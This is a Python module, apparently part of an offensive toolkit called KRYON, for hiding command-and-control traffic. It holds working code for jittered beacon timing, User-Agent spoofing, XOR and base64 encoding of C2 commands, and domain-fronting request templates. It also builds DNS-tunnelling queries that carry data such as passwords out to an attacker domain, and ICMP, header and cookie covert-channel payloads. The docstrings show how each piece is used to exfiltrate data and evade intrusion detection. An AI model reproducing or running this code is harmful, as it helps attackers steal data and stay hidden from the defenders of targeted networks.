"""
KRYON Evasion - Traffic Obfuscation

Network traffic obfuscation and C2 stealth.

Clearance Level: Alpha-Black (Anti-Forensic Operations Authority)
Specialization: Network traffic obfuscation and C2 evasion
Mission: Hide KRYON network communications

This module provides:
- User-Agent randomization
- Traffic timing randomization
- Protocol tunneling (DNS, ICMP, HTTP)
- Domain fronting
- Traffic encryption
- C2 communication obfuscation
"""

import base64
import hashlib
import random
from typing import Any


def randomize_user_agent(browser_type: str = "random", include_mobile: bool = True) -> dict[str, Any]:
    """
    Generate randomized User-Agent strings.

    Args:
        browser_type: Browser to mimic (chrome, firefox, safari, edge, random)
        include_mobile: Include mobile user agents

    Returns:
        Dictionary with random User-Agent

    Example:
        >>> result = randomize_user_agent(browser_type="chrome")
        >>> print(result['user_agent'])
        >>> # Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...
        >>>
        >>> # Use in requests
        >>> import requests
        >>> ua = randomize_user_agent()
        >>> response = requests.get(url, headers={"User-Agent": ua['user_agent']})
    """
    results = {"user_agent": "", "browser": "", "os": "", "success": False, "error": None}

    try:
        chrome_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]

        firefox_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        ]

        safari_agents = [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        ]

        edge_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
        ]

        mobile_agents = [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        ]

        # Select based on type
        if browser_type == "chrome":
            agents = chrome_agents
            results["browser"] = "Chrome"
        elif browser_type == "firefox":
            agents = firefox_agents
            results["browser"] = "Firefox"
        elif browser_type == "safari":
            agents = safari_agents
            results["browser"] = "Safari"
        elif browser_type == "edge":
            agents = edge_agents
            results["browser"] = "Edge"
        else:  # random
            agents = chrome_agents + firefox_agents + safari_agents + edge_agents
            if include_mobile:
                agents.extend(mobile_agents)

        results["user_agent"] = random.choice(agents)

        # Extract OS
        if "Windows" in results["user_agent"]:
            results["os"] = "Windows"
        elif "Mac OS X" in results["user_agent"]:
            results["os"] = "macOS"
        elif "Linux" in results["user_agent"]:
            results["os"] = "Linux"
        elif "Android" in results["user_agent"]:
            results["os"] = "Android"
        elif "iPhone" in results["user_agent"] or "iPad" in results["user_agent"]:
            results["os"] = "iOS"

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def timing_randomization(
    min_delay: float = 1.0, max_delay: float = 5.0, distribution: str = "uniform"
) -> dict[str, Any]:
    """
    Generate randomized timing delays to evade timing-based detection.

    Args:
        min_delay: Minimum delay in seconds
        max_delay: Maximum delay in seconds
        distribution: Delay distribution (uniform, exponential, normal)

    Returns:
        Dictionary with delay value

    Example:
        >>> # Random delays between requests
        >>> for i in range(10):
        ...     delay = timing_randomization(min_delay=2.0, max_delay=10.0)
        ...     time.sleep(delay['delay'])
        ...     make_request()
        >>>
        >>> # Evades detection of regular intervals

    Why Timing Randomization:
        - Regular intervals = automated tools
        - Random delays = human-like behavior
        - Evades IDS/IPS detection
        - Bypasses rate limiting
    """
    results = {"delay": 0.0, "distribution_used": distribution, "success": False, "error": None}

    try:
        if distribution == "uniform":
            delay = random.uniform(min_delay, max_delay)
        elif distribution == "exponential":
            # Exponential distribution (more short delays, fewer long ones)
            delay = random.expovariate(1.0 / ((min_delay + max_delay) / 2))
            delay = max(min_delay, min(max_delay, delay))
        elif distribution == "normal":
            # Normal distribution around midpoint
            mean = (min_delay + max_delay) / 2
            std_dev = (max_delay - min_delay) / 6
            delay = random.gauss(mean, std_dev)
            delay = max(min_delay, min(max_delay, delay))
        else:
            delay = random.uniform(min_delay, max_delay)

        results["delay"] = delay
        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def encode_c2_traffic(data: str, method: str = "base64") -> dict[str, Any]:
    """
    Encode C2 traffic to evade detection.

    Encoding Methods:
    - base64: Base64 encoding
    - hex: Hexadecimal encoding
    - url: URL encoding
    - custom: Custom XOR encoding

    Args:
        data: Data to encode
        method: Encoding method

    Returns:
        Encoded data

    Example:
        >>> # Encode shell command for C2
        >>> result = encode_c2_traffic(
        ...     data="whoami",
        ...     method="base64"
        ... )
        >>> print(result['encoded'])
        >>> # d2hvYW1p
        >>>
        >>> # Send encoded data to C2
        >>> # Decode on server side
    """
    results = {"encoded": "", "method": method, "success": False, "error": None}

    try:
        if method == "base64":
            encoded = base64.b64encode(data.encode()).decode()
        elif method == "hex":
            encoded = data.encode().hex()
        elif method == "url":
            import urllib.parse

            encoded = urllib.parse.quote(data)
        elif method == "custom":
            # Simple XOR encoding with key
            key = 0x42
            encoded = "".join(chr(ord(c) ^ key) for c in data)
            encoded = base64.b64encode(encoded.encode()).decode()
        else:
            encoded = base64.b64encode(data.encode()).decode()

        results["encoded"] = encoded
        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def decode_c2_traffic(encoded_data: str, method: str = "base64") -> dict[str, Any]:
    """
    Decode C2 traffic.

    Args:
        encoded_data: Encoded data
        method: Encoding method used

    Returns:
        Decoded data
    """
    results = {"decoded": "", "success": False, "error": None}

    try:
        if method == "base64":
            decoded = base64.b64decode(encoded_data).decode()
        elif method == "hex":
            decoded = bytes.fromhex(encoded_data).decode()
        elif method == "url":
            import urllib.parse

            decoded = urllib.parse.unquote(encoded_data)
        elif method == "custom":
            # Reverse XOR
            temp = base64.b64decode(encoded_data).decode()
            key = 0x42
            decoded = "".join(chr(ord(c) ^ key) for c in temp)
        else:
            decoded = base64.b64decode(encoded_data).decode()

        results["decoded"] = decoded
        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def generate_domain_fronting_config(target_domain: str, cdn_domain: str, fronted_host: str) -> dict[str, Any]:
    """
    Generate domain fronting configuration.

    Domain fronting uses CDN to hide true destination.

    Args:
        target_domain: Actual C2 domain
        cdn_domain: CDN domain to use (e.g., cloudfront.net)
        fronted_host: Host header value

    Returns:
        Configuration for domain fronting

    Example:
        >>> config = generate_domain_fronting_config(
        ...     target_domain="malicious-c2.com",
        ...     cdn_domain="d111111abcdef8.cloudfront.net",
        ...     fronted_host="legitimate-site.com"
        ... )
        >>>
        >>> # Use config in requests
        >>> import requests
        >>> response = requests.get(
        ...     f"https://{config['cdn_domain']}/path",
        ...     headers={"Host": config['fronted_host']}
        ... )

    How Domain Fronting Works:
        1. Connect to CDN IP (cloudfront.net)
        2. SNI = CDN domain (passes SNI inspection)
        3. Host header = actual C2 domain
        4. CDN routes to real C2 based on Host header
        5. Appears to connect to CDN, not C2
    """
    results = {
        "target_domain": target_domain,
        "cdn_domain": cdn_domain,
        "fronted_host": fronted_host,
        "example_request": "",
        "success": False,
        "error": None,
    }

    try:
        # Generate example request
        results["example_request"] = f"""
import requests

response = requests.get(
    "https://{cdn_domain}/api/endpoint",
    headers={{
        "Host": "{fronted_host}",
        "User-Agent": "Mozilla/5.0 ..."
    }},
    verify=False  # May need to disable SSL verification
)
"""

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def obfuscate_dns_query(domain: str, data: str, max_label_length: int = 63) -> dict[str, Any]:
    """
    Obfuscate data in DNS query for exfiltration.

    DNS tunneling encodes data in subdomain labels.

    Args:
        domain: Base domain under your control
        data: Data to exfiltrate
        max_label_length: Maximum DNS label length (63 chars)

    Returns:
        DNS queries to make

    Example:
        >>> # Exfiltrate data via DNS
        >>> result = obfuscate_dns_query(
        ...     domain="c2server.com",
        ...     data="password123"
        ... )
        >>>
        >>> # Make DNS queries
        >>> import socket
        >>> for query in result['dns_queries']:
        ...     socket.gethostbyname(query)

    DNS Queries Generated:
        cGFzc3dvcmQxMjM.c2server.com
        (base64 encoded data as subdomain)
    """
    results = {"dns_queries": [], "chunks": 0, "success": False, "error": None}

    try:
        # Encode data
        encoded = base64.b64encode(data.encode()).decode()
        # Replace characters invalid in DNS
        encoded = encoded.replace("+", "-").replace("/", "_").replace("=", "")

        # Split into chunks
        chunk_size = max_label_length - 10  # Leave room for sequence number
        chunks = [encoded[i : i + chunk_size] for i in range(0, len(encoded), chunk_size)]

        results["chunks"] = len(chunks)

        # Generate DNS queries
        for idx, chunk in enumerate(chunks):
            # Format: <sequence>-<data>.<domain>
            query = f"{idx:04d}-{chunk}.{domain}"
            results["dns_queries"].append(query)

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def generate_covert_channel_payload(data: str, channel_type: str = "icmp") -> dict[str, Any]:
    """
    Generate payload for covert channel communication.

    Covert Channels:
    - icmp: Data in ICMP packets
    - http_headers: Data in HTTP headers
    - http_cookies: Data in cookies
    - steganography: Data hidden in images

    Args:
        data: Data to hide
        channel_type: Type of covert channel

    Returns:
        Payload configuration

    Example:
        >>> # ICMP covert channel
        >>> result = generate_covert_channel_payload(
        ...     data="exfiltrated_data",
        ...     channel_type="icmp"
        ... )
        >>>
        >>> # HTTP header covert channel
        >>> result = generate_covert_channel_payload(
        ...     data="secret_info",
        ...     channel_type="http_headers"
        ... )
    """
    results = {"payload": "", "channel_type": channel_type, "success": False, "error": None}

    try:
        encoded = base64.b64encode(data.encode()).decode()

        if channel_type == "icmp":
            # Embed in ICMP payload
            results["payload"] = f"ping -c 1 -p {encoded.encode().hex()} target"

        elif channel_type == "http_headers":
            # Embed in custom HTTP header
            results["payload"] = {
                "headers": {
                    "X-Request-ID": encoded,
                    "X-Session-Token": hashlib.md5(data.encode()).hexdigest(),
                }
            }

        elif channel_type == "http_cookies":
            # Embed in cookie
            results["payload"] = {
                "cookies": {
                    "session_id": encoded,
                    "tracking_id": hashlib.sha256(data.encode()).hexdigest()[:32],
                }
            }

        elif channel_type == "url_params":
            # Embed in URL parameters
            results["payload"] = f"?id={encoded}&token={hashlib.md5(data.encode()).hexdigest()}"

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def jitter_requests(requests_per_hour: int = 10, jitter_percent: float = 0.3) -> dict[str, Any]:
    """
    Calculate jittered request intervals.

    Jitter adds randomness to prevent pattern detection.

    Args:
        requests_per_hour: Target requests per hour
        jitter_percent: Jitter percentage (0.3 = ±30%)

    Returns:
        List of delay intervals

    Example:
        >>> # Generate request schedule
        >>> schedule = jitter_requests(
        ...     requests_per_hour=12,  # 1 request every 5 minutes
        ...     jitter_percent=0.4     # ±40% jitter
        ... )
        >>>
        >>> # Execute requests with jitter
        >>> import time
        >>> for delay in schedule['intervals']:
        ...     time.sleep(delay)
        ...     make_c2_request()
    """
    results = {"intervals": [], "average_interval": 0, "success": False, "error": None}

    try:
        # Calculate base interval
        base_interval = 3600 / requests_per_hour  # seconds
        results["average_interval"] = base_interval

        # Generate jittered intervals
        for _ in range(requests_per_hour):
            jitter = random.uniform(-jitter_percent, jitter_percent)
            interval = base_interval * (1 + jitter)
            interval = max(1, interval)  # Minimum 1 second
            results["intervals"].append(interval)

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results
